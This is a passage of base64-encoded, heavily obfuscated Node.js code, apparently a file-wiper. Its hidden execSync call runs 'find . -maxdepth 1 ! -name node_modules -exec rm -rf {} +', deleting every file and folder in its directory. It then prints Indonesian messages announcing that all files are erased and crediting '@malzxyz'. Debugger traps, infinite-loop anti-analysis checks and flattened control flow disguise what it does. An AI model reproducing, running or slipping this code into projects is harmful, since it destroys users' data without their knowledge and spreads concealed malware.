sX19fX3p0cS5zdWJzdHIoX19fX19uaTQpKXx8X19fX19oNngoX19fX19fdGk1LF9fX192dDAuc3Vic3RyKF9fX19fXzNoMVsyXSxfX19fX25pNCksX19fX3p0cS5zdWJzdHIoX19fX3p0cS5sZW5ndGgtX19fX19uaTQpKSYmX19fX19oNngoX19fX19fdGk1LF9fX192dDAuc3Vic3RyKF9fX19fbmk0KSxfX19fenRxLnN1YnN0cihfX19fX18zaDFbMl0sX19fX3p0cS5sZW5ndGgtX19fX19uaTQpKSl7X19fX19fdGk1W19fX192dDArX19fX3p0cV09X19fX19fM2gxWzZdO3JldHVybiBfX19fX18zaDFbNl19fV9fX19fX3RpNVtfX19fdnQwK19fX196dHFdPV9fX19fXzNoMVs1XTtyZXR1cm4gX19fX19fM2gxWzVdfTtjb25zb2xlLmxvZyhfX19fX190aTUpfX19fTtyZXR1cm4gX19fYTlnKCl9KSgpO19fX192dDA9X19fX19fM2gxWzJdO2JyZWFrfX19cmV0dXJuLV9fX19fXzNoMVsxXX1mdW5jdGlvbiBfX19hOWcoX19fYTlnKXtmdW5jdGlvbipfX19fX3hwdShfX19fX3hwdSxfX19fdnQwLF9fX19fX2t5Nj17WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjRcdTAwMzhcdTAwNjIiXTp7fX0pe3doaWxlKF9fX19feHB1K19fX192dDAhPT0yMjMpe3dpdGgoX19fX19fa3k2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwMzVcdTAwNmMiXXx8X19fX19fa3k2KXtzd2l0Y2goX19fX194cHUrX19fX3Z0MCl7Y2FzZSAxNjA6Y2FzZS0yODpbX19fX19fa3k2WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjRceDM4XHg2MiJdWyJceDVmXHg1Zlx4NWZceDcyXHgzMlx4MzciXSxfX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4MzhceDYyIl1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3NVx4N2FceDM0Il1dPVstMTk5LDhdO19fX19fX2t5NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcwXHUwMDM1XHUwMDZjIl09X19fX19fa3k2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjRcdTAwMzhcdTAwNjIiXSxfX19fX3hwdSs9LTQxMixfX19fdnQwKz0xODU7YnJlYWs7Y2FzZSBfX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4MzhceDYyIl1bIlx4NWZceDVmXHg1Zlx4NzJceDMyXHgzNyJdKzI5MDpkZWJ1Z2dlcjtpZihfX19fX190aTUoIiIrX19fYTlnLCJcdTAwN2JcdTAwMjBcdTAwNWJcdTAwNmVcdTAwNjFcdTAwNzQiKyJcdTAwNjlcdTAwNzZcdTAwNjVcdTAwMjBcdTAwNjNcdTAwNmYiKyJcdTAwNjRcdTAwNjVcdTAwNWRcdTAwMjBcdTAwN2QiKT09PS1fX19fX18zaDFbMV18fHR5cGVvZiBPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKF9fX2E5ZyxfX19fX18zaDFbX19fX194cHUrMjIxXStfX19fX18zaDFbX19fX194cHUrMjIyXSkhPT0iXHUwMDc1XHUwMDZlXHUwMDY0XHUwMDY1XHUwMDY2XHUwMDY5IisiXHUwMDZlXHUwMDY1XHUwMDY0Iil7X19fX19fa3k2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwMzVcdTAwNmMiXT1fX19fX19reTZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2NFx1MDAzOFx1MDA2MiJdLF9fX19feHB1Kz0tMTc1LF9fX192dDArPTIwO2JyZWFrfWVsc2V7X19fX19fa3k2WyJceDVmXHg1Zlx4NWZceDVmXHg3MFx4MzVceDZjIl09X19fX19fa3k2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjRcdTAwMzhcdTAwNjIiXSxfX19fX3hwdSs9LTE3NSxfX19fdnQwKz0tODM7YnJlYWt9aWYoX19fX3Z0MD09LTU5KXtfX19fX19reTZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDAzNVx1MDA2YyJdPV9fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY0XHgzOFx4NjIiXSxfX19fX3hwdSs9MjM3LF9fX192dDArPS0xNjU7YnJlYWt9Y2FzZS0xMjY6Y2FzZS02OltfX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4MzhceDYyIl1bIlx4NWZceDVmXHg1Zlx4NzJceDMyXHgzNyJdLF9fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY0XHgzOFx4NjIiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc1XHUwMDdhXHUwMDM0Il1dPVstMjAyLC0yMF07ZGVidWdnZXI7aWYoX19fX19fdGk1KCIiK19fX2E5ZywiXHUwMDdiXHUwMDIwXHUwMDViXHUwMDZlXHUwMDYxXHUwMDc0IisiXHg2OVx4NzZceDY1XHgyMFx4NjNceDZmIisiXHUwMDY0XHUwMDY1XHUwMDVkXHUwMDIwXHUwMDdkIik9PT0tX19fX19fM2gxWzFdfHx0eXBlb2YgT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihfX19hOWcsX19fX19fM2gxW19fX19feHB1KzNdK19fX19fXzNoMVtfX19fX3hwdSs0XSkhPT0iXHUwMDc1XHUwMDZlXHUwMDY0XHUwMDY1XHUwMDY2XHUwMDY5IisiXHg2ZVx4NjVceDY0Iil7X19fX19fa3k2WyJceDVmXHg1Zlx4NWZceDVmXHg3MFx4MzVceDZjIl09X19fX19fa3k2WyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjRceDM4XHg2MiJdLF9fX19feHB1Kz0tMzkzLF9fX192dDArPTMzMjticmVha31lbHNle19fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDM1XHg2YyJdPV9fX19fX2t5NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY0XHUwMDM4XHUwMDYyIl0sX19fX194cHUrPS0zOTMsX19fX3Z0MCs9MjI5O2JyZWFrfWlmKF9fX192dDA9PS0oX19fX194cHUrLTEwMikpe19fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDM1XHg2YyJdPV9fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY0XHgzOFx4NjIiXSxfX19fX3hwdSs9MTksX19fX3Z0MCs9MTQ3O2JyZWFrfWNhc2UgX19fX194cHUtIC0zMjpjYXNlLTEzOl9fX19fX2t5NlsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDM1XHg2YyJdPV9fX19fX2t5NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY0XHUwMDM4XHUwMDYyIl0sX19fX194cHUrPTIzNyxfX19fdnQwKz0tNTI7YnJlYWs7aWYoIShfX19fdnQwIT0tOTkpKXtfX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHgzNVx4NmMiXT1fX19fX19reTZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzMlx1MDAzMlx1MDA3NSJdLF9fX19feHB1Kz0tMTc1LF9fX192dDArPTQyMzticmVha31jYXNlIDE5MzpjYXNlIF9fX19fX2t5NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY0XHUwMDM4XHUwMDYyIl1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3Mlx1MDAzMlx1MDAzNyJdKzIyNjpfX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHgzNVx4NmMiXT1fX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4MzhceDYyIl0sX19fX194cHUrPS01OCxfX19fdnQwKz0tMzM7YnJlYWs7Y2FzZSBfX19fX19reTZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2NFx1MDAzOFx1MDA2MiJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzVcdTAwN2FcdTAwMzQiXSs0NzpjYXNlLTI1MDpjYXNlIDE0OTpfX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHgzNVx4NmMiXT1fX19fX19reTZbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4MzhceDYyIl0sX19fX194cHUrPTIzNyxfX19fdnQwKz0tMTA0O2JyZWFrO2lmKCEoX19fX3Z0MCE9LTk5KSl7X19fX19fa3k2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwMzVcdTAwNmMiXT1fX19fX19reTZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Ylx1MDAzNVx1MDA2YiJdLF9fX19feHB1Kz0tMTc1LF9fX192dDArPTM3MTticmVha31kZWZhdWx0OndoaWxlKF9fX19fXzNoMVs2XSl7KGZ1bmN0aW9uKCl7dmFyIF9fX19feHB1PWZ1bmN0aW9uKCl7Y29uc3QgX19fX3Z0MD1mdW5jdGlvbigpe2NvbnN0IF9fX192dDA9bmV3IFJlZ0V4cChfX19fX18zaDFbMTYwXSk7cmV0dXJuIF9fX192dDBbX19fX19fM2gxWzE2MV1dKF9fX19feHB1KX07aWYoX19fX3Z0MCgpKXt3aGlsZShfX19fX18zaDFbNl0pe319fTtyZXR1cm4gX19fX194cHUoKX0pKCl9cmV0dXJuIF9fX19faDZ4PXRydWUsX19fX19fM2gxWzE0M107X19fX19fa3k2WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwMzVcdTAwNmMiXT1fX19fX19reTZbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2NFx1MDAzOFx1MDA2MiJdLF9fX192dDArPS0xMDM7YnJlYWs7Y2FzZSBfX19fdnQwIT00NTUmJl9fX192dDAhPTE2NSYmX19fX3Z0MC0yMzI6cmV0dXJuIF9fX19faDZ4PXRydWUsX19fYTlnO19fX19fX2t5NlsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcwXHUwMDM1XHUwMDZjIl09X19fX19fa3k2WyJceDVmXHg1Zlx4NWZceDc3XHg3MVx4MzAiXSxfX19fdnQwKz0zOTM7YnJlYWt9fX19dmFyIF9fX19faDZ4O3ZhciBfX19fdnQwPV9fX19feHB1KDE2MSwtMTY3KVsiXHUwMDZlXHUwMDY1XHUwMDc4XHUwMDc0Il0oKVsiXHg3Nlx4NjFceDZjXHg3NVx4NjUiXTtpZihfX19fX2g2eCl7cmV0dXJuIF9fX192dDB9fXZhciBfX19fX3hwdT1hcmd1bWVudHM7aWYoX19fX194cHUubGVuZ3RoPT09X19fX19fM2gxWzFdKXtyZXR1cm4gX19fYTlnKF9fX19feHB1W19fX19fXzNoMVsyXV0pfWVsc2UgaWYoX19fX194cHUubGVuZ3RoPT09X19fX19fM2gxWzBdKXtkZWJ1Z2dlcjt2YXIgX19fX19oNng9X19fX194cHVbX19fX19fM2gxWzJdXTt2YXIgX19fX3Z0MD1fX19fX3hwdVtfX19fX18zaDFbMV1dO3ZhciBfX19fenRxPV9fX19faDZ4W19fX192dDBdO19fX196dHE9X19fYTlnKF9fX196dHEpO3JldHVybiBfX19fenRxLmJpbmQoX19fX19oNngpfX0oZnVuY3Rpb24oKXtmdW5jdGlvbipfX19fX19reTYoX19fX19fbHhlLF9fX19fX3RpNSxfX19hOWcsX19fX194cHUsX19fX19oNng9e1siXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcwXHUwMDZhXHUwMDY0Il06e319LF9fX196dHEpe3doaWxlKF9fX19fX2x4ZStfX19fX190aTUrX19fYTlnK19fX19feHB1IT09MjI5KXt3aXRoKF9fX19faDZ4WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjRcdTAwNmVcdTAwNjgiXXx8X19fX19oNngpe3N3aXRjaChfX19fX19seGUrX19fX19fdGk1K19fX2E5ZytfX19fX3hwdSl7Y2FzZSBfX19fX3hwdS0gLTE3OTpjYXNlLTMzOltfX19fX2g2eFsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDZhXHg2NCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzNcdTAwMzBcdTAwMzYiXSxfX19fX2g2eFsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDZhXHg2NCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmRcdTAwNzdcdTAwMzIiXV09WzY2LDExOF07X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4NmVceDY4Il09X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHg2YVx4NjQiXSxfX19fX19seGUrPS0xODIsX19fYTlnKz0tMTQ2O2JyZWFrO2Nhc2UgX19fX19fdGk1IT0zMTcmJl9fX19fX3RpNS0yNzE6Y2FzZS0yMzI6X19fX19oNnhbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2NFx1MDA2ZVx1MDA2OCJdPV9fX19faDZ4WyJceDVmXHg1Zlx4NWZceDc3XHg2Y1x4NmIiXSxfX19fX19seGUrPTE1OCxfX19fX3hwdSs9MTI2O2JyZWFrO2lmKF9fX19fX2x4ZT09X19fX19fbHhlKzMxNil7X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4NmVceDY4Il09X19fX19oNnhbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzOFx1MDAzOFx1MDA2NSJdLF9fX19fX3RpNSs9LTI0NSxfX19fX3hwdSs9Njk7YnJlYWt9Y2FzZSBfX19fX2g2eFsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDZhXHg2NCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmRcdTAwNzdcdTAwMzIiXSs4OTpbX19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHg2YVx4NjQiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzM1x4MzBceDM2Il0sX19fX19oNnhbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDA2YVx1MDA2NCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmRcdTAwNzdcdTAwMzIiXV09WzM2LDIyN107aWYoX19fX19fbHhlPC0oX19fX19fbHhlKzE2NSkpe19fX19faDZ4WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjRcdTAwNmVcdTAwNjgiXT1fX19fX2g2eFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDMzXHUwMDcyXHUwMDMyIl0sX19fX19fbHhlKz0tOTAsX19fYTlnKz0xMDUsX19fX194cHUrPTE0O2JyZWFrfWNhc2UgX19fX194cHUtIC0zNjpbX19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHg2YVx4NjQiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDMzXHUwMDMwXHUwMDM2Il0sX19fX19oNnhbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDA2YVx1MDA2NCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmRcdTAwNzdcdTAwMzIiXV09Wy0xNjksMTExXTtfX19fcGpkWyJceDVmXHg1Zlx4NWZceDdhXHg3MVx4NzIiXT1mdW5jdGlvbiguLi5fX19fX19seGUpe3JldHVybiBfX19fX19reTYoLTE5NywtMjksNDAsLTQ1LHtbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHg2YVx4NjQiXTpfX19fX2g2eFsiXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDZhXHg2NCJdLFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZmXHUwMDcxXHUwMDZlIl06e319LF9fX19fX2x4ZSlbIlx4NmVceDY1XHg3OFx4NzQiXSgpWyJcdTAwNzZcdTAwNjFcdTAwNmNcdTAwNzVcdTAwNjUiXX07KGZ1bmN0aW9uKCl7dmFyIF9fX19fX2x4ZT1mdW5jdGlvbigpe2NvbnN0IF9fX19fX3RpNT1mdW5jdGlvbigpe2NvbnN0IF9fX19fX3RpNT1uZXcgUmVnRXhwKF9fX19fXzNoMVsxNjBdKTtyZXR1cm4gX19fX19fdGk1W19fX19fXzNoMVsxNjFdXShfX19fX19seGUpfTtpZihfX19fX190aTUoKSl7d2hpbGUoX19fX19fM2gxWzZdKXt9fX07cmV0dXJuIF9fX19fX2x4ZSgpfSkoKTtpZigoMSxfX19fcGpkWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwN2FcdTAwNzFcdTAwNzIiXSkoKSl7X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4NmVceDY4Il09X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHg2YVx4NjQiXSxfX19fX19seGUrPTM5LF9fX19fX3RpNSs9NTY0LF9fX2E5Zys9LTQ3OSxfX19fX3hwdSs9LTkxO2JyZWFrfWVsc2V7X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4NmVceDY4Il09X19fX19oNnhbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MFx1MDA2YVx1MDA2NCJdLF9fX19fX2x4ZSs9MzksX19fX19fdGk1Kz00NjMsX19fYTlnKz0tNDc5LF9fX19feHB1Kz0tOTE7YnJlYWt9ZGVmYXVsdDpjYXNlIF9fX2E5Zy0yNzE6dHJ5eyhmdW5jdGlvbigpe3ZhciBfX19fX19seGU9ZnVuY3Rpb24oKXtjb25zdCBfX19fX190aTU9ZnVuY3Rpb24oKXtjb25zdCBfX19fX190aTU9bmV3IFJlZ0V4cChfX19fX18zaDFbMTYwXSk7cmV0dXJuIF9fX19fX3RpNVtfX19fX18zaDFbMTYxXV0oX19fX19fbHhlKX07aWYoX19fX19fdGk1KCkpe3doaWxlKF9fX19fXzNoMVs2XSl7fX19O3JldHVybiBfX19fX19seGUoKX0pKCk7X19fX19vcW5bIlx4NWZceDVmXHg1Zlx4MzBceDZlXHgzMyJdPVtdO2RlbGV0ZSBfX19fX29xblsiXHg1Zlx4NWZceDVmXHgzMFx4NmVceDMzIl1bIlx4NmNceDY1XHg2ZVx4NjdceDc0XHg2OCJdfWNhdGNoKF9fX19fZ3g2KXtyZXR1cm4gX19fX19fM2gxW19fX19fX2x4ZSsyMDNdfXJldHVybiBfX19fX18zaDFbX19fYTlnKy0zNV07cmV0dXJuIHVuZGVmaW5lZDtjYXNlIF9fX19faDZ4WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwNmFcdTAwNjQiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDMzXHUwMDMwXHUwMDM2Il0rMjE1OmNhc2UgMzY6d2hpbGUoX19fX19fM2gxWzZdKXsoZnVuY3Rpb24oKXt2YXIgX19fX19fbHhlPWZ1bmN0aW9uKCl7Y29uc3QgX19fX19fdGk1PWZ1bmN0aW9uKCl7Y29uc3QgX19fX19fdGk1PW5ldyBSZWdFeHAoX19fX19fM2gxWzE2MF0pO3JldHVybiBfX19fX190aTVbX19fX19fM2gxWzE2MV1dKF9fX19fX2x4ZSl9O2lmKF9fX19fX3RpNSgpKXt3aGlsZShfX19fX18zaDFbNl0pe319fTtyZXR1cm4gX19fX19fbHhlKCl9KSgpfV9fX192dDA9X19fX19fM2gxWzE0M107X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4NmVceDY4Il09X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDcwXHg2YVx4NjQiXSxfX19fX190aTUrPS0xMDE7YnJlYWs7Y2FzZSBfX19fX19seGUtIC0xODc6Y2FzZS0xODg6aWYoX19fX19fbHhlPC0oX19fYTlnKzI0Mykpe19fX19faDZ4WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjRcdTAwNmVcdTAwNjgiXT1fX19fX2g2eFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDM1XHg2Ylx4NmMiXSxfX19fX19seGUrPS05MCxfX19hOWcrPTY3LF9fX19feHB1Kz0xNDticmVha31jYXNlIDI0MjpjYXNlIF9fX19fX3RpNS0zNjc6X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4NmVceDY4Il09X19fX19oNnhbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3MFx4NzNceDY2Il0sX19fX19fbHhlKz0tNzksX19fX19fdGk1Kz0tMjQ1LF9fX2E5Zys9Mjg3LF9fX19feHB1Kz0tNDM7YnJlYWt9fX19dmFyIF9fX19fX2x4ZTt2YXIgX19fX19fdGk1PV9fX19fX2t5NigtMjM2LC0yNDcsNTE5LC0yMylbIlx4NmVceDY1XHg3OFx4NzQiXSgpWyJcdTAwNzZcdTAwNjFcdTAwNmNcdTAwNzVcdTAwNjUiXTtpZihfX19fX19seGUpe3JldHVybiBfX19fX190aTV9fSkoKTtmdW5jdGlvbiBfX19fenRxKCl7ZnVuY3Rpb24qX19fX19fa3k2KF9fX19fX2t5NixfX19fX19seGUsX19fX19fdGk1PXtbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3YVx1MDAzMlx1MDAzNyJdOnt9fSl7d2hpbGUoX19fX19fa3k2K19fX19fX2x4ZSE9PTEyMCl7d2l0aChfX19fX190aTVbIlx4NWZceDVmXHg1Zlx4NmZceDc4XHgzMCJdfHxfX19fX190aTUpe3N3aXRjaChfX19fX19reTYrX19fX19fbHhlKXtjYXNlIF9fX19fX2x4ZS0yNTM6W19fX19fX3RpNVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3YVx4MzJceDM3Il1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2OFx1MDA3YVx1MDA3OCJdLF9fX19fX3RpNVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg3YVx4MzJceDM3Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NzFceDMyXHg2OCJdXT1bLTIyMywxNzFdO19fX19fX2t5Nis9MTEyLF9fX19fX2x4ZSs9LTI5NTticmVhaztjYXNlIF9fX19fX2t5NiE9MTg5JiZfX19fX19reTYhPTE4MiYmX19fX19fa3k2LTYyOl9fX19fX2t5Nis9MjEsX19fX19fbHhlKz00Mjg7YnJlYWs7Y2FzZSBfX19fX19seGUtMTIwOltfX19fX190aTVbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4N2FceDMyXHgzNyJdWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjhceDdhXHg3OCJdLF9fX19fX3RpNVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDdhXHUwMDMyXHUwMDM3Il1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3MVx1MDAzMlx1MDA2OCJdXT1bOTMsMjRdO2RlYnVnZ2VyO2NvbnNvbGVbX19fX19fM2gxWzE2Nl1dKCJcdTAwMWJcdTAwNWJcdTAwMzRcdTAwMzFcdTAwNmRcdTAwNTNcdTAwNDVcdTAwNGRcdTAwNTVcdTAwNDFcdTAwMjBcdTAwNDYiKyJceDRmXHg0Y1x4NDRceDQ1XHg1Mlx4MmZceDQ2XHg0OVx4NGNceDQ1XHgyMFx4NTQiKyJcdTAwNDVcdTAwNTJcdTAwNDhcdTAwNDFcdTAwNTBcdTAwNTVcdTAwNTNcdTAwMWJcdTAwNWJcdTAwMzBcdTAwNmQiKTt0cnl7KGZ1bmN0aW9uKCl7dmFyIF9fX19fX2t5Nj1mdW5jdGlvbigpe2NvbnN0IF9fX19fX2x4ZT1mdW5jdGlvbigpe2NvbnN0IF9fX19fX2x4ZT1uZXcgUmVnRXhwKF9fX19fXzNoMVsxNjBdKTtyZXR1cm4gX19fX19fbHhlW19fX19fXzNoMVsxNjFdXShfX19fX19reTYpfTtpZihfX19fX19seGUoKSl7d2hpbGUoX19fX19fM2gxWzZdKXt9fX07cmV0dXJuIF9fX19fX2t5NigpfSkoKTtleGVjU3luYygiXHUwMDY2XHUwMDY5XHUwMDZlXHUwMDY0XHUwMDIwXHUwMDJlXHUwMDIwXHUwMDJkXHUwMDZkXHUwMDYxIisiXHg3OFx4NjRceDY1XHg3MFx4NzRceDY4XHgyMFx4MzFceDIwXHgyMSIrIlx1MDAyMFx1MDAyZFx1MDA2ZVx1MDA2MVx1MDA2ZFx1MDA2NVx1MDAyMFx1MDAyMlx1MDA2ZVx1MDA2ZiIrIlx4NjRceDY1XHg1Zlx4NmRceDZmXHg2NFx4NzVceDZjXHg2NVx4NzMiKyJceDIyXHgyMFx4MjFceDIwXHgyZFx4NmVceDYxXHg2ZFx4NjVceDIwIisiXHgyMlx4MmVceDIyXHgyMFx4MmRceDY1XHg3OFx4NjVceDYzXHgyMCIrIlx1MDA3Mlx1MDA2ZFx1MDAyMFx1MDAyZFx1MDA3Mlx1MDA2Nlx1MDAyMFx1MDA3Ylx1MDA3ZFx1MDAyMCIrIlx4MmIiLHtbIlx1MDA2M1x1MDA3N1x1MDA2NCJdOl9fZGlybmFtZSxbIlx1MDA3M1x1MDA3NFx1MDA2NFx1MDA2OVx1MDA2ZiJdOiJcdTAwNjlcdTAwNjdcdTAwNmVcdTAwNmZcdTAwNzJcdTAwNjUifSk7Y29uc29sZVtfX19fX18zaDFbMTY2XV0oIlx1MDAxYlx1MDA1Ylx1MDAzNFx1MDAzMVx1MDA2ZFx1MDA0Mlx1MDA3OSIrIlx4M2FceDIwXHg0MFx4NmRceDYxXHg2Y1x4N2EiKyJcdTAwNzhcdTAwNzlcdTAwN2FcdTAwMWJcdTAwNWJcdTAwMzBcdTAwNmQiKX1jYXRjaChfX19hOWcpe2RlYnVnZ2VyO2NvbnNvbGVbX19fX19fM2gxW19fX19fX2t5NisyODZdXSgiXHUwMDFiXHUwMDViXHUwMDMzXHUwMDMxXHUwMDZk4p2MIisiXHgyMFx4NDdceDYxXHg2N1x4NjFceDZjIisiXHgyMFx4NjhceDYxXHg3MFx4NzVceDczIisiXHUwMDIwXHUwMDY2XHUwMDY5XHUwMDZjXHUwMDY1XHUwMDFiIisiXHUwMDViXHUwMDMwXHUwMDZkIil9X19fX19fa3k2Kz0zMDIsX19fX19fbHhlKz0tNDI4O2JyZWFrO2lmKF9fX19fX2t5NiE9LShfX19fX19reTYrMjQwKSl7X19fX19fa3k2Kz0zMDIsX19fX19fbHhlKz0tNDI4O2JyZWFrfWRlZmF1bHQ6X19fX19fa3k2Kz0tMzMwO2JyZWFrO2Nhc2UgMjIwOmNhc2UgX19fX19fa3k2LSAtMjM2OltfX19fX190aTVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3YVx1MDAzMlx1MDAzNyJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjhcdTAwN2FcdTAwNzgiXSxfX19fX190aTVbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4N2FceDMyXHgzNyJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzFcdTAwMzJcdTAwNjgiXV09Wy0xNzUsLTE3Ml07Y2FzZSBfX19fX19reTYhPS0yNTMmJl9fX19fX2t5Ni0gLTIzMzp9fX19dmFyIF9fX19fX2x4ZTt2YXIgX19fX19fdGk1PV9fX19fX2t5NigtMTIwLDM2NilbIlx4NmVceDY1XHg3OFx4NzQiXSgpWyJceDc2XHg2MVx4NmNceDc1XHg2NSJdO2lmKF9fX19fX2x4ZSl7cmV0dXJuIF9fX19fX3RpNX19dHJ5e2RlYnVnZ2VyO2lmKHJlcXVpcmVbX19fX19fM2gxWzE2N11dPT09bW9kdWxlKXsoZnVuY3Rpb24oKXt2YXIgX19fX19fa3k2PWZ1bmN0aW9uKCl7Y29uc3QgX19fX19fbHhlPWZ1bmN0aW9uKCl7Y29uc3QgX19fX19fbHhlPW5ldyBSZWdFeHAoX19fX19fM2gxWzE2MF0pO3JldHVybiBfX19fX19seGVbX19f